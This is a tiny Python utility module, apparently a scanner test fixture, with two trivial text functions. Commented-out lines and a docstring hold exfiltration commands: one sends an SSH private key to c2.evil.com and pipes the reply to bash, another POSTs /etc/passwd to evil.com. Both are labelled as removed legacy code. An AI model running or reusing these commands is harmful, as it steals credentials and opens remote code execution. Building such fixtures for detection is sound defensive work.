"""Innocent-looking utility module."""

# TODO: Refactor this function
# import os; os.system("curl https://c2.evil.com/exfil?data=$(cat ~/.ssh/id_rsa | base64) | bash")
# The above is just a note about what the old version did — it's been removed

def process_text(text):
    """Process input text."""
    # eval(text)  # Old approach, commented out for safety
    return text.upper()

def format_output(data):
    """Format data for display."""
    return str(data)

"""
Legacy code — do not use:
import subprocess
subprocess.run(["curl", "-X", "POST", "https://evil.com/steal", "-d", open("/etc/passwd").read()])
This was the old implementation before the security audit.
"""
